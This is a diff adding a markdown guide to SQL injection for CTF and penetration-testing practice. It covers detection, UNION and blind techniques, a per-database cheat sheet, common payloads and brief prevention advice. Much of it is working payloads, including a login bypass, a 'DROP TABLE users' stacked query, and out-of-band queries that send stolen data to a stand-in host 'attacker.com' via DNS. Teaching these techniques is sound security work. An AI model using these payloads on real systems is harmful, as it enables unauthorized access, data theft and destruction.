@@ -1,0 +1,118 @@
+# Comprehensive SQL Injection Guide for CTF and Penetration Testing
+What is SQL Injection (SQLi)?
+SQL injection is a vulnerability where an attacker can inject malicious SQL code into a query, allowing unauthorized access, modification, or deletion of data. It occurs due to improper sanitization of user inputs in database queries. Impacts include data leaks (e.g., passwords, credit cards), logic subversion, server compromise, or denial-of-service.
+Detecting SQL Injection Vulnerabilities
+To detect SQLi:
+
+Inject single quotes (') and observe for errors (e.g., syntax errors indicating injection).
+Use Boolean tests: ' OR 1=1 -- (true condition) vs. ' OR 1=2 -- (false) and check response differences.
+Time-based: Inject payloads causing delays (e.g., SLEEP(5)) and measure response time.
+Error-based: Force errors (e.g., 1/0) conditionally.
+Out-of-band (OAST): Trigger external interactions (e.g., DNS lookups).
+Tools like Burp Scanner automate this, but manually test every input field (GET/POST params, headers, cookies).
+
+Common locations: WHERE clauses in SELECT, UPDATE/INSERT values, table/column names, ORDER BY.
+SQL Injection Examples
+Retrieving Hidden Data
+URL: https://example.com/products?category=Gifts
+Query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+Payload: Gifts'-- (comments out the rest, shows unreleased products)
+Payload: Gifts' OR 1=1-- (shows all products)
+Subverting Application Logic
+Login query: SELECT * FROM users WHERE username = 'user' AND password = 'pass'
+Payload (username): administrator'-- (logs in as admin without password)
+UNION Attacks
+Append results from another table.
+Query: SELECT name, desc FROM products WHERE category = 'Gifts'
+Payload: ' UNION SELECT username, password FROM users--
+Determine columns: ' ORDER BY 1--, ' ORDER BY 2--, etc., until error.
+Balance columns: ' UNION SELECT NULL, NULL--
+DB-specific: Use CONCAT or || for strings.
+Examining the Database
+
+Version: SELECT @@VERSION (MSSQL/MySQL), SELECT version() (PostgreSQL), SELECT banner FROM v$version (Oracle)
+Tables: SELECT table_name FROM information_schema.tables
+Columns: SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
+Data: ' UNION SELECT username, password FROM users--
+
+Blind SQL Injection
+When no direct output:
+
+Boolean-based: ' AND (SELECT 'a' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')='a
+Response differs if true/false.
+Time-based: ' AND IF(1=1, SLEEP(5), 0)--
+Error-based conditional: Force errors only if true.
+Out-of-band: Trigger DNS/HTTP requests with data.
+
+SQL Injection Cheat Sheet by Database
+String Concatenation
+
+Oracle: 'foo'||'bar'
+MSSQL: 'foo'+'bar'
+PostgreSQL: 'foo'||'bar'
+MySQL: CONCAT('foo','bar') or 'foo' 'bar'
+
+Substring
+Extract 'ba' from 'foobar' (1-based index):
+
+All: SUBSTRING('foobar',4,2)
+
+Comments
+
+Oracle/MSSQL/PostgreSQL: --comment or /comment/
+MySQL: #comment or -- comment (space required)
+
+Time Delays
+
+Oracle: dbms_pipe.receive_message(('a'),10)
+MSSQL: WAITFOR DELAY '0:0:10'
+PostgreSQL: pg_sleep(10)
+MySQL: SLEEP(10)
+
+Conditional Time Delays
+
+Oracle: SELECT CASE WHEN (condition) THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+MSSQL: IF (condition) WAITFOR DELAY '0:0:10'
+PostgreSQL: SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL: SELECT IF(condition, SLEEP(10), 'a')
+
+DNS Lookup for OOB
+
+Oracle: SELECT UTL_INADDR.get_host_address('attacker.com')
+MSSQL: exec master..xp_dirtree '//attacker.com/a'
+PostgreSQL: copy (SELECT '') to program 'nslookup attacker.com'
+MySQL (Windows): LOAD_FILE('\\attacker.com\a')
+
+Data Exfiltration via DNS
+Append data to subdomain: e.g., (SELECT password)||'.attacker.com'
+Batched Queries
+
+MSSQL/PostgreSQL/MySQL: QUERY1; QUERY2
+Oracle: Not supported
+
+Common Payloads List
+
+Basic: ', ", ), ' OR '1'='1, " OR "1"="1
+Union: ' UNION SELECT NULL-- , ' UNION SELECT 1,2,3--
+Error: ' AND 1=CAST((SELECT secret) AS INT)--
+Blind Boolean: ' AND ASCII(SUBSTRING((SELECT secret),1,1))=97--
+Time: ' AND SLEEP(5)--
+Stacked: '; DROP TABLE users--
+
+CTF-Specific Tips
+In CTFs, flags are often in tables like 'flags' or 'secrets'. Use:
+
+Database enumeration to find tables.
+UNION to dump: ' UNION SELECT flag FROM flags--
+Blind extraction: Bit-by-bit or char-by-char with conditions.
+If blind, automate with scripts (e.g., Python requests for timing).
+Common DBMS in CTFs: MySQL, SQLite (lightweight, file-based).
+
+Prevention
+
+Use prepared statements/parameters.
+Escape inputs.
+Least privilege for DB users.
+WAFs and input validation.
+
+This guide provides detailed techniques for detection, exploitation, and CTF solving.
